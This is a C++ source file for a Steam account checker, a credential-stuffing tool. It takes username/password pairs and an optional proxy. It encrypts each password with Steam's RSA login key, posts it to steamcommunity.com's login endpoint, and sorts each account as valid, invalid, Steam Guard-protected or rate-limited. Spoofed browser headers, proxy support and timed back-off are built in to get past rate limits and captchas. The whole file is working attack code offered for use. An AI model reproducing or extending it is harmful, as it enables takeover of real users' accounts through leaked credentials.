#include "steamcheck.h"
#include "rsa.h"
#include "jsonmini.h"
#include "util.h"
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <atomic>
#include <mutex>
#include <chrono>
#include <thread>
#include <random>

#pragma comment(lib, "winhttp.lib")

static std::wstring ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, w.data(), n);
    w.resize(n ? n - 1 : 0);
    return w;
}

static std::atomic<long long> g_nextAllowed{0};
static std::atomic<long long> g_lastReq{0};

static void GlobalThrottle() {
    long long now = util::NowMs();
    long long last = g_lastReq.load();
    const long long minInterval = 900;
    if (last != 0 && now - last < minInterval) {
        std::this_thread::sleep_for(std::chrono::milliseconds((int)(minInterval - (now - last))));
        now = util::NowMs();
    }
    g_lastReq.store(now);
    long long until = g_nextAllowed.load();
    if (now < until) {
        std::this_thread::sleep_for(std::chrono::milliseconds((int)(until - now)));
    }
}

static std::string ExtractCookies(HINTERNET hReq) {
    DWORD sz = 0;
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &sz, WINHTTP_NO_HEADER_INDEX);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || sz == 0) return "";
    std::vector<wchar_t> buf(sz / sizeof(wchar_t) + 4);
    if (!WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, buf.data(), &sz, WINHTTP_NO_HEADER_INDEX)) return "";
    std::wstring raw(buf.data());
    std::string cookies;
    const wchar_t* p = raw.c_str();
    while (p && *p) {
        const wchar_t* e = wcsstr(p, L"\r\n");
        if (!e) e = p + wcslen(p);
        std::wstring line(p, e - p);
        if (line.size() >= 11) {
            std::wstring low = line;
            for (auto& c : low) c = towlower(c);
            if (low.rfind(L"set-cookie:", 0) == 0) {
                size_t colon = line.find(L':');
                if (colon != std::wstring::npos) {
                    std::wstring val = line.substr(colon + 1);
                    size_t a = 0;
                    while (a < val.size() && (val[a] == L' ' || val[a] == L'\t')) a++;
                    size_t semi = val.find(L';', a);
                    if (semi != std::wstring::npos) val = val.substr(a, semi - a);
                    else val = val.substr(a);
                    while (!val.empty() && (val.back() == L' ' || val.back() == L'\t')) val.pop_back();
                    if (!val.empty()) {
                        int n = WideCharToMultiByte(CP_UTF8, 0, val.c_str(), -1, nullptr, 0, nullptr, nullptr);
                        std::string av(n, 0);
                        WideCharToMultiByte(CP_UTF8, 0, val.c_str(), -1, av.data(), n, nullptr, nullptr);
                        if (!av.empty() && av.back() == '\0') av.pop_back();
                        if (!cookies.empty()) cookies += "; ";
                        cookies += av;
                    }
                }
            }
        }
        if (!*e) break;
        p = e + 2;
        if (!*p) break;
    }
    return cookies;
}

static int ExtractRetryAfterMs(HINTERNET hReq) {
    DWORD sz = 0;
    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &sz, WINHTTP_NO_HEADER_INDEX);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || sz == 0) return 0;
    std::vector<wchar_t> buf(sz / sizeof(wchar_t) + 4);
    if (!WinHttpQueryHeaders(hReq, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, buf.data(), &sz, WINHTTP_NO_HEADER_INDEX)) return 0;
    std::wstring raw(buf.data());
    std::wstring low = raw;
    for (auto& c : low) c = towlower(c);
    const wchar_t* p = wcsstr(low.c_str(), L"retry-after:");
    if (!p) return 0;
    p += 12;
    while (*p == L' ' || *p == L'\t') p++;
    wchar_t* end = nullptr;
    long v = wcstol(p, &end, 10);
    if (v > 0 && v < 300) return (int)(v * 1000);
    return 0;
}

struct RawResp {
    bool ok = false;
    int status = 0;
    std::string body;
    std::string setCookie;
    int retryAfterMs = 0;
};

static RawResp WinPost(HINTERNET hSession, const std::string& host, const std::string& path, const std::string& body, const std::string& cookie) {
    RawResp r;
    std::wstring wh = ToWide(host);
    std::wstring wp = ToWide(path);
    HINTERNET hConn = WinHttpConnect(hSession, wh.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConn) return r;
    HINTERNET hReq = WinHttpOpenRequest(hConn, L"POST", wp.c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) { WinHttpCloseHandle(hConn); return r; }
    std::wstring hdr = L"Content-Type: application/x-www-form-urlencoded\r\n";
    hdr += L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n";
    hdr += L"Accept: application/json, text/javascript, */*; q=0.01\r\n";
    hdr += L"Accept-Language: en-US,en;q=0.9\r\n";
    hdr += L"Origin: https://steamcommunity.com\r\n";
    hdr += L"Referer: https://steamcommunity.com/login/home/?goto=\r\n";
    hdr += L"X-Requested-With: XMLHttpRequest\r\n";
    if (!cookie.empty()) hdr += L"Cookie: " + ToWide(cookie) + L"\r\n";
    BOOL sent = WinHttpSendRequest(hReq, hdr.c_str(), (DWORD)-1, (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (sent && WinHttpReceiveResponse(hReq, nullptr)) {
        DWORD st = 0, sz = sizeof(st);
        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &st, &sz, WINHTTP_NO_HEADER_INDEX);
        r.status = (int)st;
        r.setCookie = ExtractCookies(hReq);
        r.retryAfterMs = ExtractRetryAfterMs(hReq);
        std::string acc;
        DWORD avail = 0;
        do {
            avail = 0;
            if (!WinHttpQueryDataAvailable(hReq, &avail)) break;
            if (!avail) break;
            std::string chunk(avail, 0);
            DWORD rd = 0;
            if (!WinHttpReadData(hReq, chunk.data(), avail, &rd)) break;
            chunk.resize(rd);
            acc += chunk;
        } while (avail > 0);
        r.body = acc;
        r.ok = st >= 200 && st < 300;
    }
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hConn);
    return r;
}

CheckOutcome CheckSteamAccount(const std::string& user, const std::string& pass, const std::string& proxy) {
    GlobalThrottle();

    HINTERNET hSession = nullptr;
    if (proxy.empty()) {
        hSession = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) hSession = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    } else {
        std::wstring pw = ToWide(proxy);
        hSession = WinHttpOpen(L"AvirA/1.0", WINHTTP_ACCESS_TYPE_NAMED_PROXY, pw.c_str(), WINHTTP_NO_PROXY_BYPASS, 0);
    }
    if (!hSession) return {AccStatus::Error, "no session"};
    WinHttpSetTimeouts(hSession, 12000, 12000, 12000, 12000);

    long long ts = util::NowMs();
    std::string b1 = "username=" + util::UrlEncode(user) + "&donotcache=" + std::to_string(ts);
    RawResp r1 = WinPost(hSession, "steamcommunity.com", "/login/getrsakey/", b1, "");
    if (r1.status == 429) {
        int wait = r1.retryAfterMs ? r1.retryAfterMs : 4500;
        g_nextAllowed.store(util::NowMs() + wait);
        WinHttpCloseHandle(hSession);
        return {AccStatus::RateLimited, "rate 429"};
    }
    if (!r1.ok || r1.body.empty()) { WinHttpCloseHandle(hSession); return {AccStatus::Error, "network"}; }
    if (!jsonmini::GetBool(r1.body, "success")) { WinHttpCloseHandle(hSession); return {AccStatus::Error, "no rsakey"}; }
    std::string mod = jsonmini::GetString(r1.body, "publickey_mod");
    std::string exp = jsonmini::GetString(r1.body, "publickey_exp");
    std::string stamp = jsonmini::GetString(r1.body, "timestamp");
    if (mod.empty() || exp.empty()) { WinHttpCloseHandle(hSession); return {AccStatus::Error, "bad key"}; }
    std::string enc = RsaEncryptPassword(mod, exp, pass);
    if (enc.empty()) { WinHttpCloseHandle(hSession); return {AccStatus::Error, "crypto"}; }

    std::this_thread::sleep_for(std::chrono::milliseconds(140));
    std::string b2 = "username=" + util::UrlEncode(user) + "&password=" + util::UrlEncode(enc) + "&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=" + stamp + "&remember_login=true&donotcache=" + std::to_string(util::NowMs());
    RawResp r2 = WinPost(hSession, "steamcommunity.com", "/login/dologin/", b2, r1.setCookie);
    WinHttpCloseHandle(hSession);

    if (r2.status == 429) {
        int wait = r2.retryAfterMs ? r2.retryAfterMs : 4500;
        g_nextAllowed.store(util::NowMs() + wait);
        return {AccStatus::RateLimited, "rate 429"};
    }
    if (!r2.ok && r2.body.empty()) return {AccStatus::Error, "network"};
    if (jsonmini::GetBool(r2.body, "success")) return {AccStatus::Valid, ""};
    if (jsonmini::GetBool(r2.body, "emailauth_needed") || jsonmini::GetBool(r2.body, "requires_twofactor")) return {AccStatus::Guard, "steamguard"};
    if (jsonmini::GetBool(r2.body, "captcha_needed")) {
        std::string msg = jsonmini::GetString(r2.body, "message");
        std::string low = util::ToLower(msg);
        if (low.find("rate") != std::string::npos || low.find("too many") != std::string::npos) return {AccStatus::RateLimited, msg};
        g_nextAllowed.store(util::NowMs() + 3500);
        return {AccStatus::RateLimited, "captcha"};
    }
    std::string msg = jsonmini::GetString(r2.body, "message");
    std::string low = util::ToLower(msg);
    if (low.find("rate") != std::string::npos || low.find("too many") != std::string::npos || low.find("try again") != std::string::npos || low.find("temporarily") != std::string::npos) {
        g_nextAllowed.store(util::NowMs() + 3500);
        return {AccStatus::RateLimited, msg};
    }
    if (msg.empty()) {
        if (r2.body.find("incorrect") != std::string::npos) return {AccStatus::Invalid, msg};
        return {AccStatus::Error, "empty"};
    }
    return {AccStatus::Invalid, msg};
}
